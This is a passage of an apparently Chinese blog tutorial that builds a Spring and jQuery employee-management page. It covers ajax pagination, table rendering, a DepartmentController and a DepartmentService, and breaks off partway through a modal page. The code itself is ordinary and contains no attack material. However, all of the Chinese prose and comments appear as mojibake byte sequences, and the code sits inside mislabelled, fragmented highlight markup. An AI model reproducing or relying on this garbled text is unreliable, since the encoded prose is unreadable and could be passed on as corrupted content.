æ˜¾ç¤ºé¡µç ç­‰ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            åˆ†é¡µæ¡ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_nav_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            æ˜¾ç¤ºåˆ†é¡µæ¡ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    //1.é¡µé¢åŠ è½½å®Œæˆä»¥åï¼Œç›´æ¥å»å‘é€ä¸€ä¸ªajaxè¯·æ±‚ï¼Œè¦åˆ°åˆ†é¡µæ•°æ®</span></span><br><span class="line"><span class="xml">    $(function ()&#123;</span></span><br><span class="line"><span class="xml">        //å»é¦–é¡µ</span></span><br><span class="line"><span class="xml">        to_page(1);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"><span class="xml">    </span></span><br><span class="line"><span class="xml">    function to_page(pn) &#123;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/emps",</span></span><br><span class="line"><span class="xml">            data:"pn="+pn,</span></span><br><span class="line"><span class="xml">            type:"GET",</span></span><br><span class="line"><span class="xml">            success:function (result)&#123;</span></span><br><span class="line"><span class="xml">                // console.log(result);</span></span><br><span class="line"><span class="xml">                //1.è§£æå¹¶æ˜¾ç¤ºå‘˜å·¥æ•°æ®</span></span><br><span class="line"><span class="xml">                build_emps_tables(result);</span></span><br><span class="line"><span class="xml">                //2.è§£æå¹¶æ˜¾ç¤ºåˆ†é¡µä¿¡æ¯</span></span><br><span class="line"><span class="xml">                build_page_info(result);</span></span><br><span class="line"><span class="xml">                //3.è§£æå¹¶æ˜¾ç¤ºåˆ†é¡µæ¡æ•°æ®</span></span><br><span class="line"><span class="xml">                build_page_nav(result);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    function build_emps_tables(result) &#123;</span></span><br><span class="line"><span class="xml">        //æ¸…ç©ºtable</span></span><br><span class="line"><span class="xml">        $("#emps_table tbody").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        var emps=result.extend.pageInfo.list;</span></span><br><span class="line"><span class="xml">        $.each(emps,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">            var empIdTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empId);</span></span><br><span class="line"><span class="xml">            var empNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empName);</span></span><br><span class="line"><span class="xml">            var genderTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.gender=='M'?"ç”·":"å¥³");</span></span><br><span class="line"><span class="xml">            var emailTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.email);</span></span><br><span class="line"><span class="xml">            var deptNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.department.deptName);</span></span><br><span class="line"><span class="xml">            /**</span></span><br><span class="line"><span class="xml">             * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-pencil"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">             ç¼–è¾‘</span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">             */</span></span><br><span class="line"><span class="xml">            var editBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-primary btn-sm")</span></span><br><span class="line"><span class="xml">                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-pencil")).append("ç¼–è¾‘");</span></span><br><span class="line"><span class="xml">            /**</span></span><br><span class="line"><span class="xml">             * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-trash"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> /&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">             åˆ é™¤</span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">             */</span></span><br><span class="line"><span class="xml">            var delBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-danger btn-sm")</span></span><br><span class="line"><span class="xml">                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-trash")).append("åˆ é™¤");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            var btnTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(editBtn).append(" ").append(delBtn);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            //appendæ–¹æ³•æ‰§è¡Œå®Œæˆä¹‹åè¿˜æ˜¯è¿”å›åŸæ¥çš„å…ƒç´ </span></span><br><span class="line"><span class="xml">            $("<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span>").append(empIdTd)</span></span><br><span class="line"><span class="xml">                .append(empNameTd)</span></span><br><span class="line"><span class="xml">                .append(genderTd)</span></span><br><span class="line"><span class="xml">                .append(emailTd)</span></span><br><span class="line"><span class="xml">                .append(deptNameTd)</span></span><br><span class="line"><span class="xml">                .append(btnTd)</span></span><br><span class="line"><span class="xml">                .appendTo("#emps_table tbody")</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    //è§£ææ˜¾ç¤ºåˆ†é¡µä¿¡æ¯</span></span><br><span class="line"><span class="xml">    function build_page_info(result)&#123;</span></span><br><span class="line"><span class="xml">        //æ¸…ç©ºåˆ†é¡µä¿¡æ¯</span></span><br><span class="line"><span class="xml">        $("#page_info_area").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        $("#page_info_area").append("å½“å‰"+result.extend.pageInfo.pageNum+"é¡µ,æ€»"</span></span><br><span class="line"><span class="xml">            +result.extend.pageInfo.pages+"é¡µ,æ€»"</span></span><br><span class="line"><span class="xml">            +result.extend.pageInfo.total+"æ¡è®°å½•");</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    //è§£ææ˜¾ç¤ºåˆ†é¡µæ¡,ç‚¹å‡»åˆ†é¡µè¦èƒ½å»ä¸‹ä¸€é¡µç­‰ç­‰....</span></span><br><span class="line"><span class="xml">    function build_page_nav(result) &#123;</span></span><br><span class="line"><span class="xml">        //æ¸…ç©º</span></span><br><span class="line"><span class="xml">        $("#page_nav_area").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //page_nav_area</span></span><br><span class="line"><span class="xml">        var ul = $("<span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span>").addClass("pagination");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //æ„å»ºå…ƒç´ </span></span><br><span class="line"><span class="xml">        var firstPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("é¦–é¡µ").attr("href","#"));</span></span><br><span class="line"><span class="xml">        var prePageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;laquo;"));</span></span><br><span class="line"><span class="xml">        if(result.extend.pageInfo.hasPreviousPage == false)&#123;</span></span><br><span class="line"><span class="xml">            firstPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">            prePageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            //ä¸ºå…ƒç´ æ·»åŠ ç‚¹å‡»ç¿»é¡µçš„äº‹ä»¶</span></span><br><span class="line"><span class="xml">            firstPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            prePageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pageNum-1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //æ„å»ºå…ƒç´ </span></span><br><span class="line"><span class="xml">        var nextPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;raquo;"));</span></span><br><span class="line"><span class="xml">        var lastPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("æœ«é¡µ").attr("href","#"));</span></span><br><span class="line"><span class="xml">        if(result.extend.pageInfo.hasNextPage == false)&#123;</span></span><br><span class="line"><span class="xml">            nextPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">            lastPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            //ä¸ºå…ƒç´ æ·»åŠ ç‚¹å‡»ç¿»é¡µçš„äº‹ä»¶</span></span><br><span class="line"><span class="xml">            nextPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pageNum+1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            lastPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pages);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //æ·»åŠ é¦–é¡µå’Œå‰ä¸€é¡µçš„æç¤º</span></span><br><span class="line"><span class="xml">        ul.append(firstPageLi).append(prePageLi);</span></span><br><span class="line"><span class="xml">        //1,2,3....éå†ç»™ulä¸­æ·»åŠ é¡µç æç¤º</span></span><br><span class="line"><span class="xml">        $.each(result.extend.pageInfo.navigatepageNums,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">            var numLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append(item));</span></span><br><span class="line"><span class="xml">            if(result.extend.pageInfo.pageNum == item)&#123;</span></span><br><span class="line"><span class="xml">                numLi.addClass("active");</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">            numLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(item);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            ul.append(numLi);</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">        //æ·»åŠ åä¸€é¡µå’Œæœ«é¡µçš„æç¤º</span></span><br><span class="line"><span class="xml">        ul.append(nextPageLi).append(lastPageLi);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //æŠŠulåŠ å…¥åˆ°navå…ƒç´ ä¸­</span></span><br><span class="line"><span class="xml">        var navEle = $("<span class="tag">&lt;<span class="name">nav</span>&gt;</span><span class="tag">&lt;/<span class="name">nav</span>&gt;</span>").append(ul);</span></span><br><span class="line"><span class="xml">        navEle.appendTo("#page_nav_area");</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    $("#emp_add_modal_btn").click(function () &#123;</span></span><br><span class="line"><span class="xml">        $("#empAddModal").modal(&#123;</span></span><br><span class="line"><span class="xml">            backdrop:"static"</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>æ¥ä¸‹æ¥å°±ç»™ä¸‹æ‹‰åˆ—è¡¨æ·»åŠ æ•°æ®åº“æŸ¥è¯¢å¹¶æ˜¾ç¤ºå°±å¥½äº†<br>ç¼–å†™ä¸€ä¸ªDepartmentControllerç”¨äºå¤„ç†è¯·æ±‚<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">package com.ceit.crud.controller;</span><br><span class="line"></span><br><span class="line">import com.ceit.crud.bean.Department;</span><br><span class="line">import com.ceit.crud.bean.Msg;</span><br><span class="line">import com.ceit.crud.service.DepartmentService;</span><br><span class="line">import org.springframework.beans.factory.<span class="keyword">annotation</span>.<span class="title">Autowired</span>;</span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.web.bind.<span class="keyword">annotation</span>.<span class="title">RequestMapping</span>;</span><br><span class="line">import org.springframework.web.bind.<span class="keyword">annotation</span>.<span class="title">ResponseBody</span>;</span><br><span class="line"></span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * å¤„ç†å’Œéƒ¨é—¨æœ‰å…³çš„è¯·æ±‚</span><br><span class="line"> *<span class="regexp">/</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">@Controller</span></span><br><span class="line"><span class="regexp">public class DepartmentController &#123;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    @Autowired</span></span><br><span class="line"><span class="regexp">    private DepartmentService departmentService;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    /</span>**</span><br><span class="line">     * è¿”å›æ‰€æœ‰çš„éƒ¨é—¨ä¿¡æ¯</span><br><span class="line">     *<span class="regexp">/</span></span><br><span class="line"><span class="regexp">    @RequestMapping("/depts</span><span class="string">")</span></span><br><span class="line"><span class="string">    @ResponseBody</span></span><br><span class="line"><span class="string">    public Msg getDepts()&#123;</span></span><br><span class="line"><span class="string">        //æŸ¥å‡ºçš„æ‰€æœ‰éƒ¨é—¨ä¿¡æ¯</span></span><br><span class="line"><span class="string">        List&lt;Department&gt; list = departmentService.getDepts();</span></span><br><span class="line"><span class="string">        return Msg.success().add("</span>depts<span class="string">",list);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><br>è¿˜éœ€è¦å¯¹åº”çš„Service<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.crud.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.bean.Department;</span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.dao.DepartmentMapper;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.<span class="keyword">annotation</span>.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DepartmentService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> DepartmentMapper departmentMapper;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;Department&gt; getDepts()&#123;</span><br><span class="line">        List&lt;Department&gt; list = departmentMapper.selectByExample(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æ¥ä¸‹æ¥å°±æ˜¯ç¼–å†™æ¨¡æ€æ¡†çš„äº‹ä»¶äº†<br><figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-</span></span><br><span class="line"><span class="ruby">    webè·¯å¾„ï¼š</span></span><br><span class="line"><span class="ruby">        ä¸ä»¥/å¼€å§‹çš„ç›¸å¯¹è·¯å¾„ï¼Œæ‰¾èµ„æºï¼Œä»¥å½“å‰èµ„æºçš„è·¯å¾„ä¸ºåŸºå‡†ï¼Œç»å¸¸å®¹æ˜“å‡ºç°é—®é¢˜</span></span><br><span class="line"><span class="ruby">        ä»¥/å¼€å§‹çš„ç›¸å¯¹è·¯å¾„ï¼Œæ‰¾èµ„æºï¼Œä»¥æœåŠ¡å™¨çš„è·¯å¾„ä¸ºæ ‡å‡†ï¼ˆ<span class="symbol">http:</span>/<span class="regexp">/localhost:3306ï¼‰éœ€è¦åŠ ä¸Šé¡¹ç›®å</span></span></span><br><span class="line"><span class="ruby">            <span class="symbol">http:</span>/<span class="regexp">/localhost:3306/crud</span></span></span><br><span class="line"><span class="ruby">-</span><span class="xml">-%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ taglib uri=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> prefix=<span class="string">"c"</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>å‘˜å·¥åˆ—è¡¨<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="ruby">        pageContext.setAttribute(<span class="string">"APP_PATH"</span>,request.getContextPath());</span></span><br><span class="line"><span class="ruby">    </span><span class="xml">%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/js/jquery-3.5.1.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- å‘˜å·¥æ·»åŠ çš„æ¨¡æ€æ¡† --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal fade"</span> <span class="attr">id</span>=<span class="string">"empAddModal"</span> <span class="attr">tabindex</span>=<span 